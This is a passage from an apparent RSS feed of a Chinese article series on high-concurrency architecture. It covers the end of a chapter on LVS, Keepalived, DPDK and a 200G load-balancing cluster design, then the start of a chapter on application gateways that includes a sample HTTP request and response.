ARP 查询请求，如果一不小心回复了针对 VIP 的 ARP 请求，将会立刻天下大乱：局域网内有多台机器同时声称自己拥有 10.0.0.100 这个 ip，交换机直接疯掉&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;在生产环境部署中，由于 LVS 集群是所有流量的入口，所以其可用性需要做到非常高，一般不会只部署在一个机房里，所以现实中最常用的是 NAT 模式：双向流量均经过 LVS 集群，这样便可以实现多地多中心的跨公网多活。&lt;/p&gt;&lt;h3&gt;LVS 设计思想&lt;/h3&gt;&lt;p&gt;通过上面的过程，你应该能看出来 LVS 的运行原理了：它通过在 LVS 和上游服务器上配置&lt;code&gt;虚拟 ip&lt;/code&gt;，以&lt;code&gt;对数据包进行篡改后再发送&lt;/code&gt;为手段，在标准以太网模型下构建出了一个可行的负载均衡系统。它不像交换机那样完全不修改数据包，也不像网关那样维持一个对应关系并修改很多东西，它篡改了数据包，但不多，所以可以实现非常高的性能。&lt;/p&gt;&lt;h4&gt;内核态&lt;/h4&gt;&lt;p&gt;LVS 的数据处理组件 IPVS 运行在内核态，避免了用户态的进程切换开销，再配合低负载的 DR 模式，可以进一步提升性能。&lt;/p&gt;&lt;p&gt;由于有内核态加持，LVS 比 HAProxy 和 Nginx 的单机性能都要强很多。&lt;/p&gt;&lt;h3&gt;专业的负载均衡协议：OSPF/ECMP&lt;/h3&gt;&lt;p&gt;OSPF：开放式最短路径优先协议，一种基于链路状态的内部网关协议。每个OSPF路由器都包含了整个网络的拓扑。并计算通过网络的最短路径。OSPF会通过多播的方式自动对外传播检测到的网络变化。&lt;/p&gt;&lt;p&gt;ECMP：等价多路径协议。即当存在多条不同的链路到达同一目的地址时，利用ECMP可以同时使用多条链路，不仅增加了传输带宽，还可以无时延、无丢包的备份失效链路的数据传输。如果利用传统的路由算法，只能利用其中的一条链路进行数据的传输。&lt;/p&gt;&lt;p&gt;LVS 是运行在标准以太网模型下的负载均衡软件，配合 Keepalived 可以实现高可用。而 ECMP 协议是专业的多链路路由协议，可以实现不丢包的多活，我们下面还会用到。&lt;/p&gt;&lt;h4&gt;LVS 将网关这个单点拆成了“定向”和“转发”&lt;/h4&gt;&lt;p&gt;LVS 就是网关型负载均衡继续拆单点的结果：LVS 自己只承担数据包重定向工作，将转发留给基础网以太网来解决，在单机上实现了非常高的系统容量。在最新的服务器硬件上，单个 LVS 即便在开销更大的 NAT 模式下也可以实现大约 20G 的 TCP 带宽²。&lt;/p&gt;&lt;h2&gt;Keepalived 高可用&lt;/h2&gt;&lt;p&gt;LVS 单机 20G 的带宽显然和我们 200G 的目标还相去甚远，但是我们接下来要做的第一件事并不是提升系统容量，而是先提升系统的稳定性：搭建高可用架构。&lt;/p&gt;&lt;p&gt;Keepalived 是一个非常优秀的搭建高可用集群的开源软件，它最开始就是为了和 LVS 配合而出现的，主要的作用是构建一个自选举集群。它支持 3 台控制器集群独立部署，也支持部署到应用机器上。它和 LVS 一样基于虚拟 ip 技术，可以在任意标准以太网内运行。&lt;/p&gt;&lt;h3&gt;Keepalived 运行原理&lt;/h3&gt;&lt;p&gt;Keepalived 运行原理说起来其实非常简单：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;两台机器上都配置同一个虚拟 ip（VIP）：即两台机器的真实 ip 分别是 10.0.0.101 和 10.0.0.102，但是虚拟出一个 ip 10.0.0.100，这个 ip 不属于任何物理设备，可以在两台机器之间任意切换绑定&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;两台机器频繁通信，通过分数计算确定哪台机器的分数更高，由这台机器向局域网发送 VRRP 组播报文宣称 VIP 在我这里&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;当分数高的那台机器宕机，或者断网，或者检测到服务进程消失（例如 Nginx 挂掉），分数低的那台机器会在极短时间内立刻顶上，宣称 VIP 在自己这里&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;发送给 VIP 的数据包会在短时间失效之后由新机器承接（实测中断时间小于 1 秒），实现集群高可用&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;高可用 LVS 集群&lt;/h4&gt;&lt;p&gt;LVS 和 Keepalived 配合，基于多台物理机，可以实现一个高可用的负载均衡集群，架构图如下：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.502532928064843&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNKmltic1Peqicgia0csxjVx7iaPsC6xNQOmT4eqsxxgjiaE1TCScsmf2L7ibg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1974&quot;/&gt;&lt;/p&gt;&lt;p&gt;如果 Master 因为任何原因失效（硬件故障，机房断电，人为误操作，光缆挖断，火灾地震），Standby 机器就会迅速顶上，接管流量，实现高可用的目的。&lt;/p&gt;&lt;p&gt;金融级项目可以在一个城市跨三个机房做三节点的 Keepalived 集群。为什么不做多城市集群？因为多城市已经属于“两地三中心”的高可用技术领域，一般不在二层网络上做，跨城市专用光纤的建设费用是非常高的，城市内拉光纤就便宜多了。我们最后一篇文章会讲终极高可用架构。&lt;/p&gt;&lt;h3&gt;Keepalived 也可以用在其他组件上实现高可用&lt;/h3&gt;&lt;p&gt;我司办公区自建机房内也部署了一些非关键业务，其性能要求并不高，所以我选择单独部署 Keepalived：和 Kong 网关配合提供高可用网关；和 MySQL 配合做双主双活集群；和 Apache 配合做一个跨越 4 台物理机的虚拟机集群，提供高可用 HTTP 服务；等等其它案例不再赘述。&lt;/p&gt;&lt;h2&gt;从 20G 到 200G&lt;/h2&gt;&lt;p&gt;有了 Keepalived，我们就有了集群高可用的基础，下面我们开始啃硬骨头：从 20G 到 200G。&lt;/p&gt;&lt;h3&gt;LVS 单机性能为何会卡在 20G&lt;/h3&gt;&lt;p&gt;最新的 AMD EPYC 9654 服务器 CPU 有 96 个物理核心，双路平台共有 384 个 vCore，但是 LVS 单机性能依旧徘徊在 20G 附近，为何性能无法继续提升呢？因为 Linux 网络栈已经达到性能极限了。&lt;/p&gt;&lt;h3&gt;Linux 网络栈优化&lt;/h3&gt;&lt;p&gt;由于 LVS 基于 kernel 里的 netfilter，依赖 Linux 网络栈，导致进程切换需要读写内存，数据包的发送和接收也要读写内存，在极高的带宽需求之下，相对耗时的内存读写就成了阻碍性能进一步提升的最大障碍。DPDK 和 NPU 硬件卸载就是这个问题的两个解决方案。&lt;/p&gt;&lt;h4&gt;DPDK&lt;/h4&gt;&lt;p&gt;DPDK 是 Intel 开源的高性能网络数据处理框架，运行在用户态的进程通过申请大页内存和轮询代替中断两个关键特性，给高速率网卡提供了一个高性能解决方案。它的 CPU 亲和性、多核调度架构、内存 NUMA 优化等基础架构又进一步推高了性能，最终让它成功脱颖而出成为用户态网络界面框架的首选。&lt;/p&gt;&lt;p&gt;爱奇艺开源的 DPVS https://github.com/iqiyi/dpvs 就是 DPDK 技术在负载均衡领域的成功运用。在 10G 网络下发送 64 字节的小包进行测试，DPVS 可以做到标准 LVS 的五倍性能。在这里我们保守一点，对折一下 2.5 倍，那 DPVS 的单网卡性能极限就是 50G。&lt;/p&gt;&lt;h4&gt;网卡芯片硬件卸载&lt;/h4&gt;&lt;p&gt;最新的 NPU 已经可以支持很多的硬件卸载特性：IP 分片、TCP 分段、小包重组、checksum 校验、硬件 QOS，以及最重要的 VXLAN 的剥离和插入：此功能是 DPVS 的重要组成部分，可以减少数据流互相干扰，大幅提升系统总容量。&lt;/p&gt;&lt;p&gt;此外，RDMA 技术也是网卡芯片的一大进步方向，我们将会在后面讲数据库的计算和存储分离的时候详细了解。&lt;/p&gt;&lt;h3&gt;全局锁优化&lt;/h3&gt;&lt;p&gt;除了 Linux 网络栈的限制，LVS 本身架构上的全局锁也是一个突破口，全局锁导致了海量的 CPU 核心无法被利用，我们可以借鉴阿里云的处理思路：&lt;/p&gt;&lt;h4&gt;数据包亲和性优化&lt;/h4&gt;&lt;p&gt;阿里云通过 RSS 技术把同一个五源组报文扔到同一个 CPU 上处理，保证入方向的所有相同连接上的报文都能交给相同的 CPU 处理。同时在每个核在转发出去时都用当前 CPU 上的 Local 地址，通过设置一些 fdir 规则，报文回来时后端服务器访问的目的地址就是对应 CPU 上的 local 地址。这样就能实现这一条连接上面左右方向的报文都被同一个 CPU 处理，将存储“五元组对应关系”的内存数据库在不同的 CPU 核心上隔离开，这样就可以利用多个 VIP 来实现整体系统容量的线性提升³。&lt;/p&gt;&lt;h3&gt;性能问题还是要靠架构解决&lt;/h3&gt;&lt;p&gt;当单网卡性能极限来到了 50G，该怎么将集群性能提升到 200G 呢？插四块网卡行不行呢？理论上可行，但是现实中这么大的流量的系统一定要使用架构来提升系统容量，因为还需要解决高可用问题。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.9093023255813953&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNicC1DrNpKKmJ82Ayysox4FVMIYkhof41GrwiajpVicWUQ3mvKRJ4q9pKQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1720&quot;/&gt;&lt;/p&gt;&lt;center&gt;200G 负载均衡集群架构图&lt;/center&gt;&lt;p&gt;下面我们从左到右对这个架构进行解析。&lt;/p&gt;&lt;h4&gt;1. 拆除 ip 单点：朴素的 DNS&lt;/h4&gt;&lt;p&gt;基于 DNS 技术做单域名多 ip 扩容曾是第一代负载均衡技术：朴素的 DNS 协议可以将用户的终端流量直接导向全国多个机房，实现真·性能倍增，这种技术特别适合 web 1.0 时代的静态网页，也适合搜索引擎等没有数据同步需求的服务。&lt;/p&gt;&lt;p&gt;在当年电信、网通、铁通、教育网之间只有 40G 小水管的年代，DNS 技术极大地提升了普通用户获取网络资源的速度，提升了用户体验：引导每个运营商的用户访问放在该运营商机房的服务器，可以实现“手搓 CDN 架构”。最后一篇文章我们还会谈到 DNS 技术在终极高可用架构中的价值。&lt;/p&gt;&lt;p&gt;经过 DNS 拆分，每个路由拥有一个公网 ip，承载 100G 带宽，注意，此处的路由真的是路由，并不是网关，它只需要告诉每一个数据包该到哪儿去即可。这个架构中的网关其实是后面的 LVS 充当的。而硬件路由设备承受住 200G 带宽甚至都不需要上高端的数据中心核心设备。&lt;/p&gt;&lt;h4&gt;2. 拆除交换机单点：OSPF/ECMP 路由技术&lt;/h4&gt;&lt;p&gt;上图中的&lt;code&gt;路由_1&lt;/code&gt;和&lt;code&gt;路由_2&lt;/code&gt;采用支持 ECMP 的硬件设备或者软件路由来充当，他们会把流量平均分给两个交换机。每台交换机承载 100G 带宽，对交换机来说简直就是洒洒水，2 万块人民币的硬件交换机就能接近 24 x 100G 全线速交换（二手的甚至只要六千块）。&lt;/p&gt;&lt;h4&gt;3. 拆除服务器单点：LVS 单机双网卡四网口&lt;/h4&gt;&lt;p&gt;每台 LVS 服务器都安装双口 100G 网卡 2 张，共有四个网口，这样单机可以实现 50G x 2 的极限性能。每个网卡上面的两个网口，分别连接两台交换机，可以在实现了高可用的同时保证协议速度(线速)不会成为瓶颈。&lt;/p&gt;&lt;h4&gt;4. 天下无单点：全冗余架构&lt;/h4&gt;&lt;p&gt;大家可以看到，从左至右，整个架构的每一层的每一个节点，都和左边一层的所有节点进行连接，这种全冗余架构可以满足在任意一台设备宕机的情况下，整个系统依然可用，甚至系统容量都能维持不变。&lt;/p&gt;&lt;p&gt;如果某台路由宕机，则另一台路由会将它的公网 ip 接过来，可以实现分钟级故障恢复（主要是公网路由表可能更新缓慢）。&lt;/p&gt;&lt;p&gt;如果某台交换机宕机，则左侧的路由通过 ECMP 及时调整路由配置，可以实现秒级切换。&lt;/p&gt;&lt;p&gt;如果某台 LVS 服务器宕机：Keepalived 机制会让 Standby 设备在 1 秒之内顶上。&lt;/p&gt;&lt;h4&gt;系统容量计算&lt;/h4&gt;&lt;p&gt;对于整个系统来说，四台安装了双网卡的 LVS 服务器，2 主 2 备，在两个公网 ip 入口的情况下，可以实现 50G x 2 x 2 = 200G 的总带宽，并且任意一台设备宕机不影响系统总容量。&lt;/p&gt;&lt;p&gt;200G 并不是这个系统的极限，如果我们让一组的两台 LVS 服务器使用两个 VIP 做互为主备的双活的话，可以把整个系统的容量提升到理论极限 400G。下面我们分析一下各种单项资源的性能极限：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;单个公网 ip：最大带宽为系统最大容量 200G&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;单个 VIP：最大带宽为 100G&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;单个数据流：最大带宽为单网卡性能极限 50G&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;还记得上面那台 100 万的硬件负载均衡器吗，他的最大 L4 带宽只有 40G，而我们这一套 200/400G 的设备要多少钱呢？&lt;/p&gt;&lt;p&gt;1x2 + 2x2 + 3x4 = 18万&lt;/p&gt;&lt;h4&gt;额外的优势&lt;/h4&gt;&lt;p&gt;花 18 万搭建一套图中的设备，不仅可以搞出一套 200G 的集群，而且图中的路由和交换机还有大量的容量可以用于其他业务。&lt;/p&gt;&lt;p&gt;更重要的是：LVS 集群相比于硬件负载均衡设备是可以轻松控制的，是可编程的，这对于右侧上游服务器的网络架构规划十分有利。对于云计算厂商来说，可以开发更丰富的功能来提供更复杂的服务（例如计算和存储分离的数据库），提升硬件资源的利用率，同时可以提供更复杂的功能给云平台用户使用：&lt;/p&gt;&lt;p&gt;软件带来的无限可能才是这套配置最核心的价值！&lt;/p&gt;&lt;h2&gt;彩蛋&lt;/h2&gt;&lt;h3&gt;殊途共归：硬件厂商的软件设计&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5247863247863248&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNxfRde5X7b05M6tI8tDxcGa8Gs90CiaCDfkv0pHrYXCGJDkQ8qftwib3A/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;2340&quot;/&gt;&lt;/p&gt;&lt;p&gt;这是 H3C 集团 ComwareV7 通用操作系统的架构图，当下 H3C 正在销售的产品中，除了网络边界设备（如防火墙）外，其余几乎所有的交换机、AC、AP 等以局域网为主战场的设备已经全面采用了该系统。和上一代 V5 相比，最大的变化就是把系统内核切换到了 Linux kernel。&lt;/p&gt;&lt;p&gt;这张图中最重要的就是那根“细细的红线”：网络管理进程完全位于用户态。这其实就是 DPDK 思想：传统的 UNIX 网络模型已经无法应付单机 10G 的速度了，需要读写内存的进程切换太慢了，必须要从底层网络数据处理流程上革命：抛弃操作系统提供的网络栈，直接在用户态接管所有网络流量，实现更高性能。&lt;/p&gt;&lt;p&gt;为了提高软件稳定性，H3C 也在系统内开发了一些高可用技术，和我们负载均衡集群高可用的设计思想不谋而合，异曲同工：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;支持单播、组播和热迁移的高可靠 IPC(进程间通信)技术：对应的是双机热备以及 OSPF/ECMP、VRRP 协议等&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;多进程主备选举：对应的是 Keepalived 集群选举&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;进程级内存备份(实时热备进程的内存，用于快速故障恢复和主从切换)：对应的是 OSPF/ECMP 不丢包多活技术、服务器的内存镜像技术&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;我对于设备故障的经验&lt;/h3&gt;&lt;p&gt;在机房硬件设备中，最容易损坏的肯定是磁盘（硬盘），因为它是在不断磨损的，即便是 SSD 也会随着时间的流逝寿命逐渐丢失，哪怕装在盒子里不通电也一样。但是硬盘之后，容易宕机或者损坏的是什么大家应该就猜不到了。&lt;/p&gt;&lt;p&gt;首先是断电：数据中心因为各种问题断电是最常见的故障，这个故障的概率甚至要高于软件引发的故障和电源适配器的故障。&lt;/p&gt;&lt;p&gt;其次是内存失效：内存以及内存插槽，内存电路，似乎是今天服务器硬件之中除了磁盘之外最容易坏的东西，马上就要进入 DDR5 时代，内存功耗又上了一个台阶，恐怕故障率会进一步上升。&lt;/p&gt;&lt;p&gt;然后是网络线材和供电线材接口的问题，时间长了松了或者进灰了，就会丢包或者重启。2011 年震惊世界的中微子超光速事件，就是插头松了导致的。&lt;/p&gt;&lt;p&gt;最后是高温引发的宕机：特别是 GPU 服务器，一旦服务器或者机房的散热系统出现问题，服务器很容易就主动限制性能甚至关机。&lt;/p&gt;&lt;p&gt;其它的，硬件网络设备（路由器交换机）故障、彻底挖断光纤、CPU 损坏、电源转换器寿命耗尽、主板电池故障、地震火灾洪水等，可能在一台服务器的上架寿命之中都完全无法遇到。&lt;/p&gt;&lt;h3&gt;还记得我们的目标吗？一百万 QPS&lt;/h3&gt;&lt;p&gt;通过本文构建的这个 200/400G 负载均衡集群，配合多个应用网关，以及后面海量的物理服务器，我们终于成功实现了一百万 QPS 的目标。但是，这就是一百万 QPS 的全部了吗？当然不是，这只是 web 服务层面的百万 QPS，在真实世界中，数据库才是那个最难解决的单点。&lt;/p&gt;&lt;h3&gt;接下来&lt;/h3&gt;&lt;p&gt;下一篇文章，我们将直面最难以解决的单点：数据库以及它背后的存储，探寻&lt;code&gt;IOE&lt;/code&gt;中最难去掉的那个&lt;code&gt;E&lt;/code&gt;。&lt;/p&gt;&lt;h3&gt;参考资料&lt;/h3&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;Envoy 作者 Matt Klein 2017 年的一篇英文博客 Introduction to modern network load balancing and proxying https://blog.envoyproxy.io/introduction-to-modern-network-load-balancing-and-proxying-a57f6ff80236&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;用dperf测试LVS的性能数据 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg5MjcyNzY4Mg==&amp;amp;mid=2247483684&amp;amp;idx=1&amp;amp;sn=9a065f97f1a239efbb371fedde3b8d3e&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-linktype=&quot;2&quot;&gt;https://mp.weixin.qq.com/s?__biz=Mzg5MjcyNzY4Mg==&amp;amp;mid=2247483684&amp;amp;idx=1&amp;amp;sn=9a065f97f1a239efbb371fedde3b8d3e&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;高性能负载均衡设计与实现 https://zhuanlan.zhihu.com/p/29949340&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;本系列文章已经汇总成开源技术书《PPHC》发布在 Github：https://github.com/johnlui/PPHC&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;mp-style-type data-value=&quot;3&quot;/&gt;&lt;/p&gt;&lt;/div&gt;
+<guid>e1d5d72c3249d1a95f9f8da3c8986a6c</guid>
+<title>八万字《高并发的哲学原理》第五章：拆分网络单点(上)--应用网关、负载均衡和路由器(网关)</title>
+<link>https://toutiao.io/k/2qnehmg</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content js_underline_content             autoTypeSetting24psection&amp;#10;            &quot; id=&quot;js_content&quot;&gt;&lt;p&gt;&lt;span&gt;本文共 7000 字，阅读大约需要 23 分钟。&lt;/span&gt;&lt;/p&gt;&lt;hr/&gt;&lt;section&gt;上一篇文章的末尾，我们提到了一个假想出来的五万 QPS 的系统，以及这种规模的系统架构中必然存在的负载均衡器，那本篇文章我们就来一起利用负载均衡搭建一个能够支撑五万 QPS 的系统。&lt;/section&gt;&lt;h2&gt;“监听 HTTPS 443 端口的进程”这个单点&lt;/h2&gt;&lt;p&gt;之前，我们拆出了“监听 HTTPS 443 端口的进程”这个单点，并用 kong 网关来承载了这个单点。目前，在 2 vCore 的虚拟机上，2000 QPS 的压力对应的大约是 20% 的 CPU 占用率，经过换算我们可以知道：假如 kong 的性能可以随着核心数增加而线性提升的话，在维持最大 40% CPU 占用率的情况下，需要：&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;(50000 / 2000) &lt;em&gt;2&lt;/em&gt; (20% / 40%) = 25 核&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;在这里我们先假设我们搞了一个 25 核的虚拟机，接住了这五万 QPS（实际上接不住，我们后面会说），那这个 Kong 网关到底是什么玩意儿呢？它就是标题中的“应用网关”。&lt;/p&gt;&lt;h3&gt;应用网关&lt;/h3&gt;&lt;p&gt;应用网关，又称 API 网关，顾名思义，它就是所有 API 请求的大门：自己接下所有的 HTTP/HTTPS/TCP 请求，再将请求转发给真正的上游服务器。而这些上游服务器可能是一堆虚拟机，也可能是一堆容器，甚至可以是多个数据中心各自的应用网关。由于应用网关做的事情非常少，所以它能支撑很高 QPS 的系统。&lt;/p&gt;&lt;p&gt;常见的应用网关软件有 HAProxy、Nginx、Envoy 等，而 Cisco、Juniper、F5 等一体化设备厂商也有相关的硬件产品。&lt;/p&gt;&lt;p&gt;应用网关除了提升系统容量外，还有很多别的优势。&lt;/p&gt;&lt;h4&gt;1. 解放后端架构&lt;/h4&gt;&lt;p&gt;经过对应用网关两年的使用，我现在认为所有系统都应该放在应用网关的背后，包括开发环境。&lt;/p&gt;&lt;p&gt;应用网关对后端架构的解放作用实在是太大了，可以让你在后端玩出花来：各种语言、各种技术、各种部署形式、甚至全国各地的机房都可以成为某条 URL 的最终真实服务方，让你的后端架构彻底起飞。&lt;/p&gt;&lt;h4&gt;2. TLS 卸载&lt;/h4&gt;&lt;p&gt;终端用户访问应用网关的时候采用的是 HTTPS 协议，这个协议是需要对数据进行加密解密的，应用网关非常适合干这件事情，而背后的业务系统只提供标准 HTTP 协议即可，降低了业务系统的部署复杂度和资源消耗。&lt;/p&gt;&lt;h4&gt;3. 身份验证和安全性提升&lt;/h4&gt;&lt;p&gt;应用网关可以对后端异构系统进行统一的身份验证，无需一个一个单独实现。也可以统一防火墙白名单，后端系统防火墙只对网关 ip 开放，极大提升了后端系统的安全性，降低了海量服务器安全管理的难度。甚至可以针对某条 API 进行单独鉴权，让系统的安全管控能力大幅提升。&lt;/p&gt;&lt;h4&gt;4. 指标和数据收集&lt;/h4&gt;&lt;p&gt;由于所有流量都会经过网关，所以对指标进行收集也变的简单了，你甚至可以将双向流量的内容全部记录下来，用于数据统计和安全分析。&lt;/p&gt;&lt;h4&gt;5. 数据压缩与转换&lt;/h4&gt;&lt;p&gt;应用网关还可以统一对流量进行 gzip 压缩，可以将所有业务一次性升级到 HTTP/2 和 HTTP/3，可以对数据进行格式转换（XML 到 JSON）和修改（增加/修改/删除字段），总是就是能各种上下其手，翻云覆雨，随心所欲。&lt;/p&gt;&lt;h3&gt;负载均衡&lt;/h3&gt;&lt;p&gt;应用网关的另一个价值就是负载均衡了：可以将请求的流量按照各种比例分发给不同的后端服务器，提升系统容量；可以做红蓝发布和金丝雀发布；可以针对流量特点做灰度发布；可以主动调节各个后端服务器的压力；屏蔽失效的后端服务器等等。&lt;/p&gt;&lt;h4&gt;低负载下应用网关和负载均衡可以是同一个软件&lt;/h4&gt;&lt;p&gt;虽然应用网关和负载均衡是两个不同的概念，但在低负载系统里，他们两个往往由同一个软件来扮演，例如前面说到的 Kong 网关就同时具备这两个功能。&lt;/p&gt;&lt;h2&gt;拆分应用网关&lt;/h2&gt;&lt;p&gt;一个五万 QPS 的系统，是无法使用 25 核的单机安装 Kong 网关来承载的，因为此时单机 TCP 连接数已经达到了十万以上，在这个条件下强如 Nginx 也达到性能极限了，性能不再增长甚至会开始下降，用户体验也会迅速变差。此时，我们需要对应用网关进行拆分。&lt;/p&gt;&lt;h3&gt;应用网关怎么拆&lt;/h3&gt;&lt;p&gt;逻辑上，应用网关执行的是“反向代理+数据过滤”任务，并没有要求应用网关只能由一台服务器来承接，换句话说，应用网关&lt;code&gt;不是单点&lt;/code&gt;，只要多个节点的行为一致，那就可以共同承接这五万 QPS 的真实用户流量。&lt;/p&gt;&lt;p&gt;我们只需要在多台机器上装上同样版本的应用网关软件，然后在他们之间同步配置文件即可。Kong 采用的策略是让多个实例连接同一个&lt;code&gt;PostgreSQL&lt;/code&gt;数据库，每五秒从数据库获取一次最新的配置，如果数据库挂掉，那就保持内存中的现有配置继续运行。&lt;/p&gt;&lt;p&gt;Kong 集群追求的是“最终一致性”，不追求五秒的得失，反而让系统格外地容易扩展，格外的健壮，最后一篇文章我们还会见到使用类似思维的“DNS 分布式拆分”。这个朴素的分布式架构颇有毛子暴力美学的风范，后面我们讨论列存储 clickhouse 的时候还能见到。&lt;/p&gt;&lt;p&gt;如果单个应用网关扛不住五万 QPS，那我们搞一个负载均衡器放在应用网关的前面，架构图如下：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8650306748466258&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLYSwKvVf2YNWyRL868SmEFxamMQFjia1gtFb5KN3cuBt7Z33mwUZMV3UA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1304&quot;/&gt;&lt;/p&gt;&lt;h2&gt;分层的网络&lt;/h2&gt;&lt;h3&gt;负载均衡器为何能抗住五万 QPS&lt;/h3&gt;&lt;p&gt;看到这里有人可能会疑惑，既然单机的 Nginx 都顶不住五万 QPS 带来的 TCP 资源开销，那负载均衡器如何抗住呢？因为负载均衡器承载的是比 Nginx 所承载的 TCP 更下面一层的协议：IP 协议。&lt;/p&gt;&lt;p&gt;至此，我们正式进入了网络拆分之路，这条路很难走，但收益也会很大，最终我们将得到一个 200Gbps 带宽的&lt;code&gt;软件定义负载均衡集群&lt;/code&gt;，让我们正式开始。&lt;/p&gt;&lt;h3&gt;网络是分层的&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3932702418506835&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLYwM5J4u0tvW3oWeDcq9hiaF97E0rjnGnwoLvYlr8vCroTOIJYuIc9fJw/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1902&quot;/&gt;&lt;/p&gt;&lt;center&gt;经典 TCP/IP 四层网络协议的首部&lt;/center&gt;&lt;p&gt;上面这张图引用自我的另一个系列文章：软件工程师需要了解的网络知识：从铜线到HTTP（三）—— TCP/IP¹。&lt;/p&gt;&lt;p&gt;如果你查看过网页的源代码，你就能知道网页背后是一段 HTML 代码，这段代码是被&lt;code&gt;层层包裹&lt;/code&gt;之后，再在网络中传输的，就像上图中一样。以太网之所以拥有如此之强的扩展性和兼容能力，就是因为它的“分层特性”：每一层都有专门的硬件设备来对网络进行扩展，最终组成了这个容纳全球数十亿台网络设备的“互联网”。最近，这些传统硬件设备的工作越来越多地被软件所定义，即&lt;code&gt;软件定义网络&lt;/code&gt;(SDN)。&lt;/p&gt;&lt;h3&gt;应用数据是什么&lt;/h3&gt;&lt;p&gt;应用数据就是网页背后的 HTTP 协议所包含的全部数据。&lt;/p&gt;&lt;p&gt;我们使用 Charles 反向代理软件可以轻易地得到 HTTP 协议的细节。下面我们展示一个普通的 GET 例子。使用浏览器访问 http://httpbin.org （自己尝试的时候不要选择 HTTPS 网站）：&lt;/p&gt;&lt;h4&gt;请求内容&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1&lt;br/&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;br/&gt;Cache-Control: max-age=0&lt;br/&gt;Connection: keep-alive&lt;br/&gt;Host: httpbin.org&lt;br/&gt;Upgrade-Insecure-Requests: 1&lt;br/&gt;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数据解释：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;第一行有三个元素：HTTP 方法、uri、HTTP 版本&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;之后的每一行均以冒号&lt;code&gt;:&lt;/code&gt;作为间隔符，左边是 key，右边是 value&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;HTTP 协议中，换行采用的不是 Linux 系统的 \n，而是跟 Windows 一样的 \r\n&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;响应内容&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK&lt;br/&gt;Date: Wed, 04 Jan 2023 12:07:36 GMT&lt;br/&gt;Content-Type: text/html; charset=utf-8&lt;br/&gt;Content-Length: 9593&lt;br/&gt;Connection: keep-alive&lt;br/&gt;Server: gunicorn/19.9.0&lt;br/&gt;Access-Control-Allow-Origin: *&lt;br/&gt;Access-Control-Allow-Credentials: 